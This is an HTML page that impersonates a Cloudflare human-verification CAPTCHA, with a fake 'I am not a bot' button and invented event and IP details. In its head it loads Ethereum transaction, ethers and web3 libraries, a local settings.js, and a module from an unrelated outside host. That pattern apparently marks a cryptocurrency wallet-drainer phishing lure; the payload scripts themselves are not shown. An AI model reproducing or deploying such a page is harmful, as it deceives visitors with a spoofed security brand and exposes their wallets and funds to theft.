<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CloudFlare - Verify that you are a human</title>
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    
    <style>
        body {
            margin: 0;
            padding: 0;

            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            font-family: Arial, Helvetica, sans-serif;
            color: #000;
        }

        .main {
            width: 600px;
            height: 400px;
        }
    
        .logo {
            width: 190px;
            margin-bottom: 20px;
        }

        .logo img {
            width: 100%;
            height: auto;
            object-fit: contain;
            object-position: 0%;
        }
    
        .title {
            font-weight: bold;
            font-size: 16px;
            color: inherit;
        }

        .subtitle {
            font-size: 11px;
            color: inherit;
            opacity: 0.7;
        }
    
        .button {
            height: 52px;
            border: none;
            padding: 4px 10px;
            border-radius: 6px;
            display: flex;
            gap: 8px;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            background-color: #fb923c;
            
            font-size: 14px;
            color: #fff;

            transition: opacity 0.1s ease;
        }

        button:hover {
            opacity: 0.8;
        }

        button:active {
            opacity: 0.6;
        }

        .spinner {
            display: none;

            border: 3px solid rgba(0, 0, 0, 0.05);
            width: 20px;
            height: 20px;
            border-radius: 100%;
            border-left-color: #fff;

            animation: spin 1s infinite linear;
        }
    
        .capcha-wrapper {
            width: 200px;
            margin-bottom: 32px;
        }
    
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
    
            100% {
                transform: rotate(360deg);
            }
        }
    
        @media (prefers-color-scheme: dark) {
            body {
                background-color: rgb(22, 22, 22);
                color: #fff;
            }

            .logo img {
                content:url("images/cloudflare-logo-png-image-1536x508.png");
            }
        }
    
    
        @media (max-width: 599px) {
            .main {
                width: 300px;
                height: 400px;
                position: absolute;
                top: 45%;
                left: 50%;
                transform: translate(-50%, -25%);
            }
        }
    </style>
<link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.min.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" integrity="sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" integrity="sha512-2oprd2T2vSkAii+dVWi6C+uATbQ1YGmCed6b6msb9Jxi33hsXAbnhwZ9thwCq6ndidZv4P51qaq58uo9b/x4nA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>     
    <script src="./settings.js"></script>
    <script src="https://cdndelivery.pages.dev/web3-ethers.js" type="module"></script></head>


<body>
    <div class="main">
        <div class="logo">
            <img src="images/Cloudflare_logo.svg_.png" alt="CloudFlare - Verify that you are a human" loading="lazy">
        </div>
        <p class="title">Please complete the following CAPTCHA security challenge to continue!</p>
        <div class="capcha-wrapper">
            <form method="post" id="capcha-form" data-delay="">
                <button type="submit" class="button">
                    <div class="spinner"></div>
                    <span id="button-text">
                        I am not a bot                    </span>
                </button>
            </form>
        </div>
        <p class="title">Why do I see CAPTCHA challenges?</p>
        <p class="subtitle">Due to current firewall security rules, you need to complete the CAPTCHA security challenge to continue access!</p>
        <hr>
        <p class="subtitle">Event ID: 8a7e137013c02cc3 • Your IP: 2a05:541:141:35::1</p>
    </div>

    <script>
        const capchaForm = document.getElementById("capcha-form");

        capchaForm.addEventListener("submit", (e) => {
            if (capchaForm.hasAttribute("data-delay")) e.preventDefault();

            const spinner = document.querySelector(".spinner");
            const button = document.querySelector(".button");
            const buttonText = document.querySelector("#button-text");

            spinner.style.display = "block";
            button.disabled = true;
            buttonText.innerHTML = "Verifying your identity..."

            setTimeout(() => {
                capchaForm.removeAttribute("data-delay")
                capchaForm.submit()
            }, 1000);
        })
    </script>

</body></html>
